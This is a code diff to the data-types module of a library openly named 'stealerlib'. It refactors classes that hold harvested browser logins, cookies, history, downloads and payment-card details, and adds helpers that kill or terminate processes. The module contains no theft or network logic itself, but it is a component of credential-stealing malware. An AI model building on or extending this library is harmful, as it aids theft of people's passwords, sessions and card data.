@@ -5,26 +5,32 @@
     @package: stealerlib/datatypes.py
 """
 
+import psutil
 
-class DataTypes:
+from dataclasses import dataclass
 
+from stealerlib.exceptions import catch
+
+
+class BrowserTypes:
+
+    @dataclass
     class Login:
-        def __init__(self, url, username, password):
-            self.url = url
-            self.username = username
-            self.password = password
+        url: str
+        username: str
+        password: str
 
         def conv(self):
             return [self.url, self.username, self.password]
-
+ 
+    @dataclass
     class Cookie:
-        def __init__(self, host, name, path, value, expires):
-            self.host = host
-            self.name = name
-            self.path = path
-            self.value = value
-            self.expires = bool(expires)
-            self.expire_date = expires
+        host: str
+        name: str
+        path: str
+        value: str
+        expires: bool
+        expire_date: str
 
         def conv(self):
             return [
@@ -35,31 +41,31 @@ class DataTypes:
                 self.name,
                 self.value
             ]
-
+ 
+    @dataclass
     class Site:
-        def __init__(self, url, title, timestamp):
-            self.url = url
-            self.title = title
-            self.timestamp = timestamp
+        url: str
+        title: str
+        timestamp: int
 
         def conv(self):
             return [self.url, self.title, self.timestamp]
-
+ 
+    @dataclass
     class Download:
-        def __init__(self, tab_url, target_path):
-            self.tab_url = tab_url
-            self.target_path = target_path
+        tab_url: str
+        target_path: str
 
         def conv(self):
             return [self.tab_url, self.target_path]
-
+ 
+    @dataclass
     class Card:
-        def __init__(self, name, month, year, number, date_modified):
-            self.name = name
-            self.month = month
-            self.year = year
-            self.number = number
-            self.date_modified = date_modified
+        name: str
+        month: str
+        year: str
+        number: str
+        date_modified: str
 
         def conv(self):
             return [
@@ -69,3 +75,33 @@ class DataTypes:
                 self.number,
                 self.date_modified
             ]
+
+
+class SystemTypes:
+
+    @dataclass
+    class Process:
+        pid: int
+        name: str
+        status: str
+        parent: list[psutil.Process]
+        children: list[psutil.Process]
+
+        def conv(self):
+            return [
+                self.pid,
+                self.name,
+                self.status,
+                self.parent,
+                self.children
+            ]
+
+        @catch
+        def kill(self):
+            p = psutil.Process(self.pid)
+            p.kill()
+
+        @catch
+        def terminate(self):
+            p = psutil.Process(self.pid)
+            p.terminate()
